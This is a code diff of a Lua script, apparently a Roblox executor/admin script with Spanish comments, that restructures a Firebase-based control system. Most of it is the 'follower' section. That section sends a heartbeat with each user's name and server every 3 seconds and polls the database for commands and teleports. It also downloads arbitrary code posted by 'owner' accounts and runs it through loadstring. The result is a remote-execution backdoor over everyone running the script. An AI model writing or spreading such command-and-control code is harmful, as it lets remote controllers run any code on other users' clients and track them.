@@ -903,339 +903,313 @@ end
         end  
     end
 
-    if not isOwner and not isAdmin then
-        task.spawn(function()
-            local lastProcessedPings = {}
+-- ========================================
+-- 🔥 SISTEMA DE AUTO-DETECCIÓN PARA FOLLOWERS
+-- ========================================
+if not isOwner and not isAdmin then
+    -- 🚀 AUTO-HEARTBEAT: Envía automáticamente presencia a Owners y Admins
+    task.spawn(function()
+        while true do
+            task.wait(3) -- Actualizar cada 3 segundos
             
-            while true do
-                task.wait(0.3)
-                
-                -- Escuchar pings de Owners
-                for _, ownerId in ipairs(ownerIds) do
-                    local ownerIdStr = tostring(ownerId)
-                    local pings = FirebaseAPI:Get("/pings/owners/" .. ownerIdStr)
-                    
-                    if pings and type(pings) == "table" then
-                        for pingId, pingData in pairs(pings) do
-                            if type(pingData) == "table" and not lastProcessedPings[pingId] then
-                                lastProcessedPings[pingId] = true
-                                
-                                -- Solo responder si el ping es para mi servidor o para todos
-                                if pingData.serverId == currentServerId or pingData.serverId == "all" then
-                                    pcall(function()
-                                        FirebaseAPI:Set("/heartbeats/owners/" .. ownerIdStr .. "/" .. myUserId, {
-                                            name = LocalPlayer.Name,
-                                            serverId = currentServerId,
-                                            timestamp = tick(),
-                                            responseToPing = pingId
-                                        })
-                                    end)
-                                end
-                            end
-                        end
-                    end
-                end
-                
-                -- Escuchar pings de Admins
-                for _, adminId in ipairs(adminIds) do
-                    local adminIdStr = tostring(adminId)
-                    local pings = FirebaseAPI:Get("/pings/admins/" .. adminIdStr)
-                    
-                    if pings and type(pings) == "table" then
-                        for pingId, pingData in pairs(pings) do
-                            if type(pingData) == "table" and not lastProcessedPings[pingId] then
-                                lastProcessedPings[pingId] = true
-                                
-                                if pingData.serverId == currentServerId or pingData.serverId == "all" then
-                                    pcall(function()
-                                        FirebaseAPI:Set("/heartbeats/admins/" .. adminIdStr .. "/" .. myUserId, {
-                                            name = LocalPlayer.Name,
-                                            serverId = currentServerId,
-                                            timestamp = tick(),
-                                            responseToPing = pingId
-                                        })
-                                    end)
-                                end
-                            end
-                        end
-                    end
-                end
+            -- Enviar heartbeat a todos los Owners
+            for _, ownerId in ipairs(ownerIds) do
+                local ownerIdStr = tostring(ownerId)
+                pcall(function()
+                    FirebaseAPI:Set("/heartbeats/owners/" .. ownerIdStr .. "/" .. myUserId, {
+                        name = LocalPlayer.Name,
+                        serverId = currentServerId,
+                        timestamp = tick(),
+                        role = "Follower",
+                        autoDetected = true  -- Marca para saber que fue auto-detectado
+                    })
+                end)
             end
-        end)
+            
+            -- Enviar heartbeat a todos los Admins
+            for _, adminId in ipairs(adminIds) do
+                local adminIdStr = tostring(adminId)
+                pcall(function()
+                    FirebaseAPI:Set("/heartbeats/admins/" .. adminIdStr .. "/" .. myUserId, {
+                        name = LocalPlayer.Name,
+                        serverId = currentServerId,
+                        timestamp = tick(),
+                        role = "Follower",
+                        autoDetected = true
+                    })
+                end)
+            end
+        end
+    end)
+    
+    -- 🎯 SISTEMA DE BRING (sin cambios)
+    task.spawn(function()
+        local lastProcessedBrings = {}
         
- task.spawn(function()
-            local lastProcessedBrings = {}
+        while true do
+            task.wait(0.2)
             
-            while true do
-                task.wait(0.2)
+            for _, ownerId in ipairs(ownerIds) do
+                local ownerIdStr = tostring(ownerId)
+                local brings = FirebaseAPI:Get("/bring/owners/" .. ownerIdStr .. "/" .. currentServerId)
                 
-                for _, ownerId in ipairs(ownerIds) do
-                    local ownerIdStr = tostring(ownerId)
-                    local brings = FirebaseAPI:Get("/bring/owners/" .. ownerIdStr .. "/" .. currentServerId)
-                    
-                    if brings and type(brings) == "table" then
-                        for bringId, bringData in pairs(brings) do
-                            if type(bringData) == "table" and not lastProcessedBrings[bringId] then
-                                if tostring(bringData.targetUserId) == tostring(myUserId) then
-                                    lastProcessedBrings[bringId] = true
-                                    
-                                    -- Retry múltiple para streaming
-                                    task.spawn(function()
-                                        for attempt = 1, 3 do
-                                            TeleportToPlayer(ownerIdStr)
-                                            if attempt < 3 then
-                                                task.wait(0.15)
-                                            end
+                if brings and type(brings) == "table" then
+                    for bringId, bringData in pairs(brings) do
+                        if type(bringData) == "table" and not lastProcessedBrings[bringId] then
+                            if tostring(bringData.targetUserId) == tostring(myUserId) then
+                                lastProcessedBrings[bringId] = true
+                                
+                                task.spawn(function()
+                                    for attempt = 1, 3 do
+                                        TeleportToPlayer(ownerIdStr)
+                                        if attempt < 3 then
+                                            task.wait(0.15)
                                         end
-                                    end)
-                                end
-                            end
-                        end
-                    end
-                end
-                
-                for _, adminId in ipairs(adminIds) do
-                    local adminIdStr = tostring(adminId)
-                    local brings = FirebaseAPI:Get("/bring/admins/" .. adminIdStr .. "/" .. currentServerId)
-                    
-                    if brings and type(brings) == "table" then
-                        for bringId, bringData in pairs(brings) do
-                            if type(bringData) == "table" and not lastProcessedBrings[bringId] then
-                                if tostring(bringData.targetUserId) == tostring(myUserId) then
-                                    lastProcessedBrings[bringId] = true
-                                    
-                                    -- Retry múltiple para streaming
-                                    task.spawn(function()
-                                        for attempt = 1, 3 do
-                                            TeleportToPlayer(adminIdStr)
-                                            if attempt < 3 then
-                                                task.wait(0.15)
-                                            end
-                                        end
-                                    end)
-                                end
+                                    end
+                                end)
                             end
                         end
                     end
                 end
             end
-        end)
+            
+            for _, adminId in ipairs(adminIds) do
+                local adminIdStr = tostring(adminId)
+                local brings = FirebaseAPI:Get("/bring/admins/" .. adminIdStr .. "/" .. currentServerId)
+                
+                if brings and type(brings) == "table" then
+                    for bringId, bringData in pairs(brings) do
+                        if type(bringData) == "table" and not lastProcessedBrings[bringId] then
+                            if tostring(bringData.targetUserId) == tostring(myUserId) then
+                                lastProcessedBrings[bringId] = true
+                                
+                                task.spawn(function()
+                                    for attempt = 1, 3 do
+                                        TeleportToPlayer(adminIdStr)
+                                        if attempt < 3 then
+                                            task.wait(0.15)
+                                        end
+                                    end
+                                end)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end)
 
-        task.spawn(function()
-            local lastProcessedCommands = {}
+    -- 📡 SISTEMA DE COMANDOS (sin cambios)
+    task.spawn(function()
+        local lastProcessedCommands = {}
+        
+        while true do
+            task.wait(0.5)
             
-            while true do
-                task.wait(0.5)
+            for _, ownerId in ipairs(ownerIds) do
+                local ownerIdStr = tostring(ownerId)
+                local commands = FirebaseAPI:Get("/commands/owners/" .. ownerIdStr .. "/" .. currentServerId)
                 
-                for _, ownerId in ipairs(ownerIds) do
-                    local ownerIdStr = tostring(ownerId)
-                    local commands = FirebaseAPI:Get("/commands/owners/" .. ownerIdStr .. "/" .. currentServerId)
-                    
-                    if commands and type(commands) == "table" then
-                        for cmdId, cmdData in pairs(commands) do
-                            if type(cmdData) == "table" and not lastProcessedCommands[cmdId] then
-                                lastProcessedCommands[cmdId] = true
-                                if cmdData.command then
-                                    ProcessCommand({
-                                        command = cmdData.command,
-                                        senderUserId = ownerIdStr
-                                    })
-                                end
-                            end
-                        end
-                    end
-                end
-                
-                for _, adminId in ipairs(adminIds) do
-                    local adminIdStr = tostring(adminId)
-                    local commands = FirebaseAPI:Get("/commands/admins/" .. adminIdStr .. "/" .. currentServerId)
-                    
-                    if commands and type(commands) == "table" then
-                        for cmdId, cmdData in pairs(commands) do
-                            if type(cmdData) == "table" and not lastProcessedCommands[cmdId] then
-                                lastProcessedCommands[cmdId] = true
-                                if cmdData.command then
-                                    ProcessCommand({
-                                        command = cmdData.command,
-                                        senderUserId = adminIdStr
-                                    })
-                                end
+                if commands and type(commands) == "table" then
+                    for cmdId, cmdData in pairs(commands) do
+                        if type(cmdData) == "table" and not lastProcessedCommands[cmdId] then
+                            lastProcessedCommands[cmdId] = true
+                            if cmdData.command then
+                                ProcessCommand({
+                                    command = cmdData.command,
+                                    senderUserId = ownerIdStr
+                                })
                             end
                         end
                     end
                 end
             end
-        end)
-        
-        task.spawn(function()
-            local lastProcessedExecs = {}
             
-            while true do
-                task.wait(0.5)
+            for _, adminId in ipairs(adminIds) do
+                local adminIdStr = tostring(adminId)
+                local commands = FirebaseAPI:Get("/commands/admins/" .. adminIdStr .. "/" .. currentServerId)
                 
-                for _, ownerId in ipairs(ownerIds) do
-                    local ownerIdStr = tostring(ownerId)
-                    local executions = FirebaseAPI:Get("/executions/owners/" .. ownerIdStr)
-                    
-                    if executions and type(executions) == "table" then
-                        for execId, execData in pairs(executions) do
-                            if type(execData) == "table" and not lastProcessedExecs[execId] then
-                                local shouldExecute = false
-                                
-                                if execData.target == ".all" then
-                                    shouldExecute = true
-                                elseif execData.target == ".s" and execData.serverId == currentServerId then
-                                    shouldExecute = true
-                                elseif execData.target == LocalPlayer.Name then
-                                    shouldExecute = true
-                                end
-                                
-                                if shouldExecute and execData.code then
-                                    lastProcessedExecs[execId] = true
-                                    
-                                    pcall(function()
-                                        local func = loadstring(execData.code)
-                                        if func then func() end
-                                    end)
-                                end
+                if commands and type(commands) == "table" then
+                    for cmdId, cmdData in pairs(commands) do
+                        if type(cmdData) == "table" and not lastProcessedCommands[cmdId] then
+                            lastProcessedCommands[cmdId] = true
+                            if cmdData.command then
+                                ProcessCommand({
+                                    command = cmdData.command,
+                                    senderUserId = adminIdStr
+                                })
                             end
                         end
                     end
                 end
             end
-        end)
+        end
+    end)
+    
+    -- 💻 SISTEMA DE EJECUCIÓN REMOTA (sin cambios)
+    task.spawn(function()
+        local lastProcessedExecs = {}
         
-    elseif isAdmin then
-        task.spawn(function()
-            local lastProcessedCommands = {}
+        while true do
+            task.wait(0.5)
             
-            while true do
-                task.wait(0.5)
+            for _, ownerId in ipairs(ownerIds) do
+                local ownerIdStr = tostring(ownerId)
+                local executions = FirebaseAPI:Get("/executions/owners/" .. ownerIdStr)
                 
-                for _, ownerId in ipairs(ownerIds) do
-                    local ownerIdStr = tostring(ownerId)
-                    local commands = FirebaseAPI:Get("/commands/owners/" .. ownerIdStr .. "/" .. currentServerId)
-                    
-                    if commands and type(commands) == "table" then
-                        for cmdId, cmdData in pairs(commands) do
-                            if type(cmdData) == "table" and not lastProcessedCommands[cmdId] then
-                                lastProcessedCommands[cmdId] = true
-                                if cmdData.command then
-                                    ProcessCommand({
-                                        command = cmdData.command,
-                                        senderUserId = ownerIdStr
-                                    })
-                                end
+                if executions and type(executions) == "table" then
+                    for execId, execData in pairs(executions) do
+                        if type(execData) == "table" and not lastProcessedExecs[execId] then
+                            local shouldExecute = false
+                            
+                            if execData.target == ".all" then
+                                shouldExecute = true
+                            elseif execData.target == ".s" and execData.serverId == currentServerId then
+                                shouldExecute = true
+                            elseif execData.target == LocalPlayer.Name then
+                                shouldExecute = true
+                            end
+                            
+                            if shouldExecute and execData.code then
+                                lastProcessedExecs[execId] = true
+                                
+                                pcall(function()
+                                    local func = loadstring(execData.code)
+                                    if func then func() end
+                                end)
                             end
                         end
                     end
                 end
             end
-        end)
+        end
+    end)
         
-        task.spawn(function()
-            local lastProcessedExecs = {}
+-- ========================================
+-- 🔥 SISTEMA PARA ADMINS
+-- ========================================
+elseif isAdmin then
+    -- 🚀 AUTO-HEARTBEAT para Admins: Envía presencia a Owners
+    task.spawn(function()
+        while true do
+            task.wait(3)
             
-            while true do
-                task.wait(0.5)
+            -- Los Admins envían heartbeat a los Owners
+            for _, ownerId in ipairs(ownerIds) do
+                local ownerIdStr = tostring(ownerId)
+                pcall(function()
+                    FirebaseAPI:Set("/heartbeats/owners/" .. ownerIdStr .. "/" .. myUserId, {
+                        name = LocalPlayer.Name,
+                        serverId = currentServerId,
+                        timestamp = tick(),
+                        role = "Admin",
+                        autoDetected = true
+                    })
+                end)
+            end
+        end
+    end)
+    
+    -- 📡 Escuchar comandos de Owners
+    task.spawn(function()
+        local lastProcessedCommands = {}
+        
+        while true do
+            task.wait(0.5)
+            
+            for _, ownerId in ipairs(ownerIds) do
+                local ownerIdStr = tostring(ownerId)
+                local commands = FirebaseAPI:Get("/commands/owners/" .. ownerIdStr .. "/" .. currentServerId)
                 
-                for _, ownerId in ipairs(ownerIds) do
-                    local ownerIdStr = tostring(ownerId)
-                    local executions = FirebaseAPI:Get("/executions/owners/" .. ownerIdStr)
-                    
-                    if executions and type(executions) == "table" then
-                        for execId, execData in pairs(executions) do
-                            if type(execData) == "table" and not lastProcessedExecs[execId] then
-                                local shouldExecute = false
-                                
-                                if execData.target == ".all" then
-                                    shouldExecute = true
-                                elseif execData.target == ".s" and execData.serverId == currentServerId then
-                                    shouldExecute = true
-                                elseif execData.target == LocalPlayer.Name then
-                                    shouldExecute = true
-                                end
-                                
-                                if shouldExecute and execData.code then
-                                    lastProcessedExecs[execId] = true
-                                    
-                                    pcall(function()
-                                        local func = loadstring(execData.code)
-                                        if func then func() end
-                                    end)
-                                end
+                if commands and type(commands) == "table" then
+                    for cmdId, cmdData in pairs(commands) do
+                        if type(cmdData) == "table" and not lastProcessedCommands[cmdId] then
+                            lastProcessedCommands[cmdId] = true
+                            if cmdData.command then
+                                ProcessCommand({
+                                    command = cmdData.command,
+                                    senderUserId = ownerIdStr
+                                })
                             end
                         end
                     end
                 end
             end
-        end)
+        end
+    end)
+    
+    -- 💻 Ejecutar código remoto de Owners
+    task.spawn(function()
+        local lastProcessedExecs = {}
         
-  task.spawn(function()
-            local lastProcessedBrings = {}
+        while true do
+            task.wait(0.5)
             
-            while true do
-                task.wait(0.2)
+            for _, ownerId in ipairs(ownerIds) do
+                local ownerIdStr = tostring(ownerId)
+                local executions = FirebaseAPI:Get("/executions/owners/" .. ownerIdStr)
                 
-                for _, ownerId in ipairs(ownerIds) do
-                    local ownerIdStr = tostring(ownerId)
-                    local brings = FirebaseAPI:Get("/bring/owners/" .. ownerIdStr .. "/" .. currentServerId)
-                    
-                    if brings and type(brings) == "table" then
-                        for bringId, bringData in pairs(brings) do
-                            if type(bringData) == "table" and not lastProcessedBrings[bringId] then
-                                if tostring(bringData.targetUserId) == tostring(myUserId) then
-                                    lastProcessedBrings[bringId] = true
-                                    
-                                    -- Retry múltiple para streaming
-                                    task.spawn(function()
-                                        for attempt = 1, 3 do
-                                            TeleportToPlayer(ownerIdStr)
-                                            if attempt < 3 then
-                                                task.wait(0.15)
-                                            end
+                if executions and type(executions) == "table" then
+                    for execId, execData in pairs(executions) do
+                        if type(execData) == "table" and not lastProcessedExecs[execId] then
+                            local shouldExecute = false
+                            
+                            if execData.target == ".all" then
+                                shouldExecute = true
+                            elseif execData.target == ".s" and execData.serverId == currentServerId then
+                                shouldExecute = true
+                            elseif execData.target == LocalPlayer.Name then
+                                shouldExecute = true
+                            end
+                            
+                            if shouldExecute and execData.code then
+                                lastProcessedExecs[execId] = true
+                                
+                                pcall(function()
+                                    local func = loadstring(execData.code)
+                                    if func then func() end
+                                end)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end)
+    
+    -- 🎯 Sistema de Bring de Owners
+    task.spawn(function()
+        local lastProcessedBrings = {}
+        
+        while true do
+            task.wait(0.2)
+            
+            for _, ownerId in ipairs(ownerIds) do
+                local ownerIdStr = tostring(ownerId)
+                local brings = FirebaseAPI:Get("/bring/owners/" .. ownerIdStr .. "/" .. currentServerId)
+                
+                if brings and type(brings) == "table" then
+                    for bringId, bringData in pairs(brings) do
+                        if type(bringData) == "table" and not lastProcessedBrings[bringId] then
+                            if tostring(bringData.targetUserId) == tostring(myUserId) then
+                                lastProcessedBrings[bringId] = true
+                                
+                                task.spawn(function()
+                                    for attempt = 1, 3 do
+                                        TeleportToPlayer(ownerIdStr)
+                                        if attempt < 3 then
+                                            task.wait(0.15)
                                         end
-                                    end)
-                                end
+                                    end
+                                end)
                             end
                         end
                     end
                 end
             end
-        end)
-        
-        task.spawn(function()
-            local lastProcessedPings = {}
-            
-            while true do
-                task.wait(0.3)
-                
-                for _, ownerId in ipairs(ownerIds) do
-                    local ownerIdStr = tostring(ownerId)
-                    local pings = FirebaseAPI:Get("/pings/owners/" .. ownerIdStr)
-                    
-                    if pings and type(pings) == "table" then
-                        for pingId, pingData in pairs(pings) do
-                            if type(pingData) == "table" and not lastProcessedPings[pingId] then
-                                lastProcessedPings[pingId] = true
-                                
-                                if pingData.serverId == currentServerId or pingData.serverId == "all" then
-                                    pcall(function()
-                                        FirebaseAPI:Set("/heartbeats/owners/" .. ownerIdStr .. "/" .. myUserId, {
-                                            name = LocalPlayer.Name,
-                                            serverId = currentServerId,
-                                            timestamp = tick(),
-                                            responseToPing = pingId
-                                        })
-                                    end)
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-        end)
-    end
+        end
+    end)
+end
     
 if isOwner or isAdmin then
     local toggleBind = Enum.KeyCode.L
@@ -1860,38 +1834,24 @@ local function UpdatePlayersList()
         end
         
 detectBtn.MouseButton1Click:Connect(function()
-            detectBtn.Text = "📡 Limpiando detecciones anteriores..."
-            
-            local userType = isOwner and "owners" or "admins"
-            
-            FirebaseAPI:Delete("/heartbeats/" .. userType .. "/" .. myUserId)
-            
-            task.wait(0.3)
-            
-            detectBtn.Text = "📡 Enviando señal..."
-            
-            local pingId = HttpService:GenerateGUID(false)
-            
-            FirebaseAPI:Set("/pings/" .. userType .. "/" .. myUserId .. "/" .. pingId, {
-                serverId = currentServerId,
-                timestamp = tick()
-            })
-            
-            task.wait(1.5)
-            
-            UpdatePlayersList()
-            
-            local count = 0
-            for _, child in ipairs(playersList:GetChildren()) do
-                if child:IsA("Frame") and child.Name ~= LocalPlayer.Name .. " (You)" then
-                    count = count + 1
-                end
-            end
-            
-            detectBtn.Text = "✓ Encontrados" .. count .. " Jugadores!"
-            task.wait(1.5)
-            detectBtn.Text = "🔍 Buscando Jugadores (Server)"
-        end)
+    detectBtn.Text = "🔄 Actualizando lista..."
+    
+    -- Simplemente actualizar la lista - los followers ya están enviando heartbeats automáticamente
+    task.wait(0.5)
+    
+    UpdatePlayersList()
+    
+    local count = 0
+    for _, child in ipairs(playersList:GetChildren()) do
+        if child:IsA("Frame") and child.Name ~= LocalPlayer.Name .. " (You)" then
+            count = count + 1
+        end
+    end
+    
+    detectBtn.Text = "✓ " .. count .. " Jugadores Detectados!"
+    task.wait(1.5)
+    detectBtn.Text = "🔍 Actualizar Lista"
+end)
         
         local commandsPanel = Instance.new("Frame")
         commandsPanel.Name = "CommandsPanel"
